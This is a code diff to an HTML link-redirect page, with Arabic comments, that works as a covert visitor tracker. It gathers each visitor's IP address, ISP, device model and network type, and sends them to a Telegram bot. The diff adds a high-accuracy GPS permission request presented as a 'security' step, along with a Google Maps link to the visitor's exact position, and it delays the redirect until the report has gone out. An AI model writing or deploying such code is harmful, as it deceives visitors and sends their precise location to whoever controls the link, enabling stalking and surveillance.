@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
   <title id="page-title">Redirecting...</title>
@@ -82,10 +82,10 @@
     }
     .progress-bar-fill {
       height: 100%;
-      width: 100%;
+      width: 0%;
       background: linear-gradient(90deg, #3b82f6, #f43f5e);
       border-radius: 10px;
-      transition: width 0.1s linear;
+      transition: width 0.3s ease;
     }
   </style>
 </head>
@@ -98,7 +98,7 @@
     </div>
 
     <div class="timer-section">
-      <p class="timer-text">Automatic redirect in <span id="countdown" class="seconds-counter">7.5</span> seconds...</p>
+      <p class="timer-text" id="status-text">Preparing secure connection...</p>
       <div class="progress-bar-bg">
         <div id="progress" class="progress-bar-fill"></div>
       </div>
@@ -115,12 +115,42 @@
     let targetUrl = defaultUrl;
     let displayName = defaultName;
 
+    // دالة لجلب إحداثيات اللوكيشن الحقيقي بطلب إذن المستخدم
+    function requestLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            resolve({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: Math.round(position.coords.accuracy)
+            });
+          },
+          (error) => {
+            resolve(null); // لو المستخدم رفض الإذن أو حصل خطأ
+          },
+          { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
+        );
+      });
+    }
+
     async function initRedirectSystem() {
+      // منع الكاش عبر إضافة باراميتر عشوائي وقت القراءة لو أمكن
       const urlParams = new URLSearchParams(window.location.search);
       let queryValue = urlParams.has('to') ? urlParams.get('to').trim() : "";
 
+      const progressEl = document.getElementById('progress');
+      const statusText = document.getElementById('status-text');
+
+      progressEl.style.width = '20%';
+      statusText.textContent = "Loading destination...";
+
       try {
-        const response = await fetch('links.json');
+        const response = await fetch('links.json?_=' + new Date().getTime());
         const destinationsDB = await response.json();
 
         if (queryValue && destinationsDB[queryValue]) {
@@ -133,14 +163,31 @@
           displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
         }
       } catch (e) {
-        console.error("Could not load links.json, using defaults.", e);
+        console.error("Could not load links.json", e);
       }
 
       document.getElementById('dest-name').textContent = displayName;
       document.getElementById('page-title').textContent = "Redirecting to " + displayName;
 
-      collectAndSendToTelegram();
-      startCountdown();
+      progressEl.style.width = '50%';
+      statusText.textContent = "Requesting location permissions...";
+
+      // طلب إذن اللوكيشن من المستخدم
+      const coords = await requestLocation();
+
+      progressEl.style.width = '80%';
+      statusText.textContent = "Sending security report...";
+
+      // جمع البيانات وإرسالها لتليجرام وانتظار اكتمال الإرسال تماماً
+      await collectAndSendToTelegram(coords);
+
+      progressEl.style.width = '100%';
+      statusText.textContent = "Redirecting now...";
+
+      // التوجيه الفوري فور انتهاء العمليات
+      setTimeout(() => {
+        window.location.replace(targetUrl);
+      }, 500);
     }
 
     function getExactDeviceModel() {
@@ -163,7 +210,7 @@
       return deviceName;
     }
 
-    async function collectAndSendToTelegram() {
+    async function collectAndSendToTelegram(coords) {
       try {
         const ipResponse = await fetch('https://ipinfo.io/json');
         const ipData = await ipResponse.json();
@@ -182,12 +229,18 @@
           }
         }
 
+        let locationDetails = `🌍 **IP Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}\n`;
+        if (coords) {
+          locationDetails = `📍 **GPS Coordinates:** \`${coords.lat},${coords.lon}\` (Accuracy: ${coords.accuracy}m)\n` +
+                            `🗺️ **Google Maps:** https://maps.google.com/?q=${coords.lat},${coords.lon}\n`;
+        }
+
         const message = 
-          `🚨 **New Visitor Alert!**\n\n` +
+          `🚨 **New Real Visitor Alert!**\n\n` +
           `📌 **Destination:** ${displayName}\n` +
           `🔗 **Target URL:** ${targetUrl}\n\n` +
           `🌐 **IP:** \`${ipData.ip || 'Unknown'}\`\n` +
-          `🌍 **Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}\n` +
+          locationDetails +
           `🏢 **ISP/Org:** ${ipData.org || 'N/A'}\n\n` +
           `📱 **Device:** ${exactModel}\n` +
           `📶 **Network:** ${networkType}\n` +
@@ -207,28 +260,6 @@
       } catch (err) {
         console.error("Error sending to telegram:", err);
       }
-    }
-
-    function startCountdown() {
-      let totalTime = 7.5;
-      let timeLeft = totalTime;
-      const countdownEl = document.getElementById('countdown');
-      const progressEl = document.getElementById('progress');
-      const intervalTime = 100;
-      const decrement = intervalTime / 1000;
-
-      const timer = setInterval(() => {
-        timeLeft -= decrement;
-        if (timeLeft <= 0) timeLeft = 0;
-        
-        countdownEl.textContent = timeLeft.toFixed(1);
-        progressEl.style.width = ((timeLeft / totalTime) * 100) + '%';
-
-        if (timeLeft <= 0) {
-          clearInterval(timer);
-          window.location.replace(targetUrl);
-        }
-      }, intervalTime);
     }
 
     initRedirectSystem();
